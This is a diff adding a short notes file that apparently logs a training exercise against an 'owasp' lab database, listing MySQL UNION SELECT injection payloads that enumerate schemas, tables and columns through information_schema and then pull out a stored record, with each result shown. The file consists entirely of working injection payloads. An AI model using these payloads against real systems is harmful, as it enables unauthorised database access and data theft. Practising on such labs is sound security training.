@@ -1,0 +1,18 @@
+' UNION SELECT 1,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata -- -
+
+= Ville : 1 - Superhéros : |mysql|,|information_schema|,|performance_schema|,|sys|,|owasp|
+
+
+' UNION SELECT 1,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name='owasp' -- -
+= exercices
+
+' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = 'owasp' LIMIT 1 OFFSET 2 -- -
+= exo2_sql
+
+' UNION SELECT 1,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name='exo2_sql' -- -
+
+= |id|,|superheros|,|ville|
+
+' UNION SELECT ville,superheros FROM exo2_sql WHERE superheros='Jean' -- -
+
+Jean - Zigma_B
